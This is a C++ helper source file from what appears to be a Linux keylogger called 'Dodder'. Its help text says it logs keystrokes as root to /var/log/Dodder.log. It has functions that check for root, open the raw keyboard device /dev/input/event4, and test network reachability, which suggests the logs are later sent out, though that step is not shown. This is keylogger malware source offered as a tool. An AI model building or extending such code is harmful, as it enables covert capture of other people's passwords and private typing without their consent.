#include <util.h>
#include <iostream>

/**
 * Function: printHelpText
 * Argument: none
 * return: none
 * use: used to print the help message
 **/

void printHelpText(void)
{
    std::cout << "Usage: Logger [OPTION]..." << std::endl
        << "Starts the logging of the keystrokes,"
        << " provided process ran in sudo." << std::endl
        << " If no arguments given then the program will store the log files at"
        << " /var/log/Dodder.log" << std::endl
        << "-h, --help\tdisplay this help and exit" << std::endl
        << "-v, --version\tdisplay the version of the program then exit" << std::endl
        << "-s, --stdout\tdisplay the keystrokes in the stdout" << std::endl
        << "-f, --file\tstore the keystrokes in the file provided" << std::endl;
}
/**
 * Function: printVersionInfo
 * Arguments: none
 * return: none
 * use: used to print the version info
 **/

void printVersionInfo(void)
{
    std::cout << "At the alpha stage" << std::endl;
}


/**
 * Function: checkRoot
 * Arguments: none
 * return: none
 * use: Used to check if the user executed the program by giving superuser 
 *      privillages
 * Exceptions: throw runtime_error if not in root
 **/

void checkRoot(void)
{
    uid_t id = geteuid(); //if used in sudo then id = 0
    if(id != 0)
        throw std::runtime_error("Must be in root");
}

/**
 * Function: getKeyboardFile
 * Arguments: none
 * return: the path of the file which will be used to get input from keyboard
 * use: used in function openKeyboardFile to get the path of the file for keyboard
 * Exceptions: no exceptions
 **/

const char *getKeyboardFile(void) noexcept
{
    const char *str = "/dev/input/event4";
    return str;
}

/**
 * Function: openKeyboardFile
 * Arguments: none
 * return: the file descriptor for the opened keyboard file, which will
 *         check the keystrokes
 * use: used to open the file for the keyboard
 * Exceptions: throw runtime_error if file is not opened
 **/

int openKeyboardFile(void)
{
    int fd = open(getKeyboardFile(), O_RDONLY);
    if(fd < 0)
        throw std::runtime_error("The file descriptor can't be negetive\
                , there was error in opening the keyboard input file");
    return fd;
}

const bool isNetPresent(void)
{
    addrinfo hints, *servinfo;
    std::memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; // use AF_INET6 to force IPv6
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo("www.example.com", "http", &hints, &servinfo) != 0)
        //checks for 
        return false;
    freeaddrinfo(servinfo); // all done with this structure
    return true;
}
